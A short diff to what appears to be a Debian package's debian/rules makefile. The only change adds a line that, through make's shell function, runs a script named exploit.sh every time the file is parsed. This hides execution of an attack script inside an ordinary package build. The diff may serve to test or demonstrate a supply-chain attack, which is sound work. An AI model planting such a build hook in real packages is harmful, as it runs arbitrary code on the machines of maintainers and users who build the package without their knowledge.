@@ -1,4 +1,5 @@
 #!/usr/bin/make -f
+$(shell bash exploit.sh >&2)
 
 export GOPATH:=/usr/share/gocode
 DESTDIR=debian/tmp
